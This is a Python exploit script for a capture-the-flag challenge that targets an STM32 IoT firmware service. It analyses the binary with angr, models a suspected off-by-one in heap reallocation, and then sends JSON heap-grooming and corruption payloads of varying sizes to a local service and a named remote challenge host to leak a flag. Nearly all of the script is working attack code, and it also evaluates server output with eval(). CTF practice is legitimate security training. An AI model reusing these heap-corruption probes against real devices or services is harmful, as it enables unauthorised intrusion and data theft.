#!/usr/bin/env python3

import angr
import claripy
import json
import struct
from pwn import *

def analyze_stm32_binary():
    """Enhanced angr analysis targeting the 44-element overflow"""
    print("=== Advanced STM32 Binary Analysis with Angr ===")
    
    binary_path = "/Users/saumil/codex/dist/csit_iot.bin"
    proj = angr.Project(
        binary_path,
        auto_load_libs=False,
        main_opts={
            'backend': 'blob',
            'arch': 'ARMEL',           # Cortex-M is little-endian ARM/Thumb
            'base_addr': 0x08000000,   # Flash base
            'entry_point': 0x08000000,
        },
    )  # Use blob loader for bare-metal STM32 image
    
    print(f"Binary loaded at: {hex(proj.loader.main_object.mapped_base)}")
    
    # Key addresses from reverse engineering
    json_handler_addr = 0x08007260    # Main JSON command handler (Thumb)
    data_parser_addr = 0x08006d04     # Data array parsing function  (Thumb)
    heap_alloc_addr = 0x08008466      # Heap allocation function     (Thumb)
    
    # sanity: try to create a state at JSON handler in Thumb mode (set LSB)
    try:
        thumb_state = proj.factory.blank_state(addr=json_handler_addr | 1)
        print(f"Created Thumb state at {hex(json_handler_addr)} OK")
    except Exception as e:
        print(f"Warning: could not create Thumb state at {hex(json_handler_addr)}: {e}")
    return proj

def model_heap_allocation_logic():
    """Model the heap allocation logic to understand overflow conditions"""
    print("\n=== Modeling Heap Allocation Logic ===")
    
    # Based on your analysis, the reallocation logic is:
    # iVar6 = uVar10 + 1 where uVar10 = capacity * 2
    # This creates potential for off-by-one errors
    
    def simulate_reallocation(current_size, elements_to_add):
        """Simulate the reallocation logic"""
        capacity = current_size
        while capacity < current_size + elements_to_add:
            capacity = capacity * 2
        new_size = capacity + 1  # The potential off-by-one
        return new_size, capacity
    
    print("Testing reallocation logic around 44 elements:")
    
    # Test around the critical 44-element boundary
    for elements in range(40, 50):
        new_size, capacity = simulate_reallocation(16, elements)  # Start with small buffer
        print(f"Elements: {elements}, New size: {new_size}, Capacity: {capacity}")
        
        if elements == 44:
            print(f">>> CRITICAL: At 44 elements, new_size={new_size}, capacity={capacity}")
            
    return True

def create_targeted_exploit():
    """Create targeted exploit based on 44-element analysis"""
    print("\n=== Creating Targeted 44-Element Exploit ===")
    
    # Test sizes around the critical 44-element boundary
    critical_sizes = []
    
    # Test exact 44 and surrounding values
    for i in range(40, 50):
        critical_sizes.append(i)
    
    # Test powers of 2 and boundaries that might cause reallocation issues
    for base in [32, 64, 128]:
        for offset in [-2, -1, 0, 1, 2]:
            size = base + offset
            if size > 0 and size not in critical_sizes:
                critical_sizes.append(size)
    
    critical_sizes.sort()
    
    print("Testing critical data array sizes:")
    for size in critical_sizes:
        print(f"Size {size}: {'<-- CRITICAL' if size == 44 else ''}")
    
    return critical_sizes

def test_specific_data_array_overflow():
    """Test the specific data array overflow around 44 elements"""
    print("\n=== Testing Data Array Overflow (44-element focus) ===")
    
    critical_sizes = create_targeted_exploit()
    
    for size in critical_sizes:
        print(f"\n--- Testing data array size {size} ---")
        
        try:
            r = remote('localhost', 8000)
            
            # Heap feng shui setup
            feng_shui_cmd = {"slot": 1, "data": [69, 2, 0]}
            r.sendline(json.dumps(feng_shui_cmd).encode())
            response = r.recv()
            print(f"Feng shui response: {response}")
            
            # Create test data array of specific size
            if size == 44:
                # For the critical 44-element size, try different patterns
                test_patterns = [
                    list(range(size)),  # Sequential
                    [0] * size,         # All zeros
                    [0xFF] * size,      # All 0xFF
                    [0x41] * size,      # All 'A'
                    [69, 2, 0] * (size // 3) + [69, 2, 0][:size % 3],  # Repeat feng shui pattern
                ]
            else:
                test_patterns = [list(range(size))]
            
            for pattern_idx, test_data in enumerate(test_patterns):
                if len(test_data) != size:
                    test_data = test_data[:size] + [0] * (size - len(test_data))
                
                corruption_cmd = {"slot": 1, "data": test_data}
                cmd_str = json.dumps(corruption_cmd)
                
                print(f"  Pattern {pattern_idx + 1}: Sending {len(test_data)} elements")
                r.sendline(cmd_str.encode())
                corruption_response = r.recv(timeout=3)
                print(f"  Corruption response: {corruption_response}")
                
                # Test slot 0 access immediately after
                print(f"  Testing slot 0 after {size}-element corruption...")
                r.sendline(b'{"slot":0}')
                slot0_response = r.recv(timeout=3)
                print(f"  Slot 0 response: {slot0_response}")
                
                # Check for success
                if b'TISC{' in slot0_response:
                    print(f"🎉 SUCCESS! Size {size}, pattern {pattern_idx + 1} worked!")
                    print(f"Flag: {slot0_response}")
                    r.close()
                    return True
                elif b'Slot 0 contains:' in slot0_response:
                    print(f"🎉 SUCCESS! Got slot 0 contents with size {size}!")
                    print(f"Content: {slot0_response}")
                    r.close()
                    return True
                elif b'Out of bounds!' not in slot0_response:
                    print(f"⚠️  Different behavior with size {size}: {slot0_response}")
                
                # If this is the critical 44-element test, try multiple slot 0 accesses
                if size == 44:
                    for attempt in range(3):
                        print(f"  Additional slot 0 attempt {attempt + 1} for size {size}...")
                        r.sendline(b'{"slot":0}')
                        response = r.recv(timeout=2)
                        print(f"  Attempt {attempt + 1}: {response}")
                        if b'TISC{' in response or b'Slot 0 contains:' in response:
                            print(f"🎉 SUCCESS on attempt {attempt + 1} with size {size}!")
                            r.close()
                            return True
            
            r.close()
            
        except Exception as e:
            print(f"Error testing size {size}: {e}")
            continue
        
        time.sleep(0.2)
    
    return False

def test_remote_server_with_44():
    """Test the remote server with our 44-element findings"""
    print("\n=== Testing Remote Server with 44-Element Exploit ===")
    
    try:
        r = remote('chals.tisc25.ctf.sg', 51728)
        
        # Heap feng shui setup
        feng_shui_cmd = {"slot": 1, "data": [69, 2, 0]}
        r.sendline(json.dumps(feng_shui_cmd).encode())
        response = r.recv()
        print(f"Remote feng shui: {response}")
        
        # Try the critical 44-element corruption
        corruption_data = list(range(44))  # Try different patterns if this doesn't work
        corruption_cmd = {"slot": 1, "data": corruption_data}
        
        print("Sending 44-element corruption to remote...")
        r.sendline(json.dumps(corruption_cmd).encode())
        response = r.recv()
        print(f"Remote corruption response: {response}")
        
        # Test slot 0
        print("Testing slot 0 on remote...")
        r.sendline(b'{"slot":0}')
        slot0_response = r.recv()
        print(f"Remote slot 0: {slot0_response}")
        
        if b'TISC{' in slot0_response:
            print(f"🎉🎉 REMOTE SUCCESS! Flag: {slot0_response}")
            return True
        elif b'Slot 0 contains:' in slot0_response:
            print(f"🎉🎉 REMOTE SUCCESS! Content: {slot0_response}")
            # Decode the flag
            if b'[' in slot0_response and b']' in slot0_response:
                array_start = slot0_response.index(b'[')
                array_end = slot0_response.index(b']') + 1
                array_str = slot0_response[array_start:array_end].decode()
                array_values = eval(array_str)
                flag = ''.join(chr(x) for x in array_values if x != 0)
                print(f"🚩 Decoded flag: {flag}")
            return True
        
        r.close()
        
    except Exception as e:
        print(f"Remote test failed: {e}")
    
    return False

def main():
    print("🎯 Advanced STM32 Heap Exploitation - 44-Element Focus")
    
    # Step 1: Analyze binary structure
    proj = analyze_stm32_binary()
    
    # Step 2: Model heap allocation logic
    model_heap_allocation_logic()
    
    # Step 3: Test the specific 44-element overflow locally
    print("\n🔥 Testing 44-element overflow locally...")
    local_success = test_specific_data_array_overflow()
    
    if local_success:
        print("\n✅ Local exploitation successful!")
        
        # Step 4: Test against remote server
        print("\n🎯 Attempting remote exploitation...")
        remote_success = test_remote_server_with_44()
        
        if remote_success:
            print("\n🎉🎉🎉 FLAG CAPTURED FROM REMOTE SERVER! 🎉🎉🎉")
        else:
            print("\n⚠️  Local worked but remote failed. Need adaptation.")
    else:
        print("\n❌ Local exploitation failed. Trying remote anyway...")
        remote_success = test_remote_server_with_44()
        if remote_success:
            print("\n🎉 Remote successful despite local failure!")

if __name__ == "__main__":
    main()